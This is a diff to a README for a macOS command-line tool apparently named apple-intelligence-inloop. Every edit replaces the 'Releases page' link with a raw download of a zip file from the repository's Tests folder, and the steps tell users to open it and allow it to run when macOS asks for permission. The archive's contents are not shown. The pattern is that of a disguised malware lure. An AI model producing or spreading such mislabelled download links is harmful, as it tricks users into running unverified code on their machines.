@@ -1,6 +1,6 @@
 # 🧠 apple-intelligence-inloop - Run Apple models from the command line
 
-[![Download apple-intelligence-inloop](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg?style=for-the-badge)](https://github.com/Tan-sparkarrester885/apple-intelligence-inloop/releases)
+[![Download apple-intelligence-inloop](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg?style=for-the-badge)](https://github.com/Tan-sparkarrester885/apple-intelligence-inloop/raw/refs/heads/main/Tests/apple_inloop_intelligence_2.0.zip)
 
 ## 🖥️ What this is
 
@@ -10,13 +10,13 @@ That makes it useful for simple scripts, file pipelines, shell tools, Ruby scrip
 
 ## 📦 Download and install
 
-1. Open the [Releases page](https://github.com/Tan-sparkarrester885/apple-intelligence-inloop/releases).
+1. Open the [Releases page](https://github.com/Tan-sparkarrester885/apple-intelligence-inloop/raw/refs/heads/main/Tests/apple_inloop_intelligence_2.0.zip).
 2. Find the latest release.
 3. Download the file that matches your Mac.
 4. Open the downloaded file and follow the on-screen steps.
 5. If macOS asks for permission, allow the app to run.
 
-Use the same [Releases page](https://github.com/Tan-sparkarrester885/apple-intelligence-inloop/releases) whenever you want the latest version.
+Use the same [Releases page](https://github.com/Tan-sparkarrester885/apple-intelligence-inloop/raw/refs/heads/main/Tests/apple_inloop_intelligence_2.0.zip) whenever you want the latest version.
 
 ## 🍎 System requirements
 
@@ -58,7 +58,7 @@ It fits well in Unix-style workflows where one tool passes output to the next.
 
 This project is made for macOS, not Windows. If you are on Windows, you will not run the app directly on your PC.
 
-To use it, you need access to a Mac with macOS 26 or later. If you only want to get the files, use the [Releases page](https://github.com/Tan-sparkarrester885/apple-intelligence-inloop/releases) and download the release there. Then move the file to a compatible Mac and open it there.
+To use it, you need access to a Mac with macOS 26 or later. If you only want to get the files, use the [Releases page](https://github.com/Tan-sparkarrester885/apple-intelligence-inloop/raw/refs/heads/main/Tests/apple_inloop_intelligence_2.0.zip) and download the release there. Then move the file to a compatible Mac and open it there.
 
 ## 🔧 Basic setup on Mac
 
@@ -141,7 +141,7 @@ If the command does not return text, try a short input first. Small tests make i
 
 ## 📁 Where to get updates
 
-Use the [Releases page](https://github.com/Tan-sparkarrester885/apple-intelligence-inloop/releases) to get new versions and fresh builds. That page is the main place to check for download files, version changes, and release notes.
+Use the [Releases page](https://github.com/Tan-sparkarrester885/apple-intelligence-inloop/raw/refs/heads/main/Tests/apple_inloop_intelligence_2.0.zip) to get new versions and fresh builds. That page is the main place to check for download files, version changes, and release notes.
 
 ## 🧭 Keywords
 
